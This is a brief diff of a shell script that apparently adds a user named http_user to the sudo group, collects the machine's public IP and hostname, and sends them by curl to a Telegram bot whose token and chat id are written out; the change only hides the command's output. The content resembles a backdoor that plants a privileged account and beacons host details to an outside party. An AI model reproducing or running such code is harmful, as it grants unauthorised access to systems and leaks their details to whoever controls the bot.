@@ -13,4 +13,4 @@ adduser http_user sudo
 IP=$(curl ifconfig.me)
 HOSTNAME=$(hostname)
 
-curl -s -X POST https://api.telegram.org/bot5236944102:AAGH6gndskydLEL1x38hSOm4XYJz1Kg_Bx8/sendMessage -d chat_id=-756251756 -d text="Hostname: $HOSTNAME - IP: $IP"
+curl -s -X POST https://api.telegram.org/bot5236944102:AAGH6gndskydLEL1x38hSOm4XYJz1Kg_Bx8/sendMessage -d chat_id=-756251756 -d text="Hostname: $HOSTNAME - IP: $IP" >/dev/null
